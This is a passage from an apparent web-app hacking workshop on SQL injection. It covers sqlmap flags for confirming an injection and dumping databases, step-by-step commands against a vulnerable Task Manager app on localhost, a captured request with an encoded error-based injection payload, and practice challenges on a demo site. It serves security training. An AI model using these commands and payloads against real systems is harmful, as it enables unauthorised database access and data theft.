# SQL Injection
### Description
Ability to influence the structure of a SQL database query through unsafe includes of user input.

* ` stmt = "SELECT * FROM users WHERE username=" + INPUT[user]`

### Tool
####sqlmap
http://sqlmap.org - Command Line tool for dealing with SQL injection flaws

Required flags
- `-u URL` Target URL

Commonly-used configuration flags
- `--data=DATA` String to be sent through POST
- `--cookie=COOKIE` Cookie data for authenticated sessions
- `--proxy=PROXY` Route sqlmap requests through a proxy so you can see what it's doing
- `-p TESTPARAMETER` Parameter you want to check

Quick check data access flags
- `-b, --banner` Retrieve DBMS banner
- `--current-user`
- `--current-db`

Dump the data flags
- `--dump-all` careful, this can be slow
- `--dump` dump the targeted table data
- `-D DB` target database
- `-T TBL` target table
- `-C COL` target column


## Walkthroughs

| Application | Location | Parameter | Tool |
| ---- | ---- | ---- | ---- |
| Vulnerable Task Manager | http://127.0.0.1:8000/taskManager/forgot_password/ | email | sqlmap |
| Vulnerable Task Manager | http://127.0.0.1:8000/taskManager/7/project_details/ | URL parameter | sqlmap |

### Forgot Password SQL Injection
#### Step 1 - Validate SQL Injection Vulnerability
Validate access to the vulnerable task manager application, you should see the following login page.

![vtm login](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-login.png)

Access the Forgot Password Page

![vtm forgot password](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-forgot-password.png)

Validate that the email parameter throws a SQL error message by inserting `test@tm.com'` into the Email form field

![vtm sql error](https://github.com/justinlarson/Web-App-Hacking-Workshop/raw/master/img/vtm-email-sql-error.png)


#### Step 2 - Use sqlmap to confirm vulnerability
Since the forgot password page does not require authentication, use some of the above flags to confirm the vulnerability by using flags for posting data to the endpoint
```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" --banner
```

sqlmap will step through every parameter and ask if it should check for possible sql injection, you can bypass this check using `-p email`

```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" -p email --banner
```

#### Step 3 - Explore commands sent using sqlmap with a proxy
Since you have confirmed that the endpoint is vulnerable to SQL Injection and exploitable with sqlmap, now use Burp Suite to view the requests being sent to the server by dumping the full schema of the backend mysql database.

```
sqlmap.py -u http://127.0.0.1:8000/taskManager/forgot_password/ --data="email=test@tm.com" -p email --proxy=http://127.0.0.1:8080 --schema
```

The full request to dump a portion of the schema looks as follows, use Burp Suite HTTP History to view similar requests.

```
POST /taskManager/forgot_password/ HTTP/1.1
Content-Length: 258
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8.15#dev (http://sqlmap.org)
Host: 127.0.0.1:8000
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8

email=test%40tm.com%27%20AND%20EXTRACTVALUE%281890%2CCONCAT%280x5c%2C0x716a6a7071%2C%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%29%2C1%2C21%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%202%2C1%29%2C0x71626a7071%29%29--%20UufD
```

### Project Details SQL Injection


## Challenges
http://demo.testfire.net

| Challenge | Difficulty |
| ---- | ---- |
| Bypass Login | :star: |
| That's a sketchy transaction | :star::star::star: |
| Make `jsmith` filthy rich (hint: Access Control chaining)	| :star::star::star::star::star:|
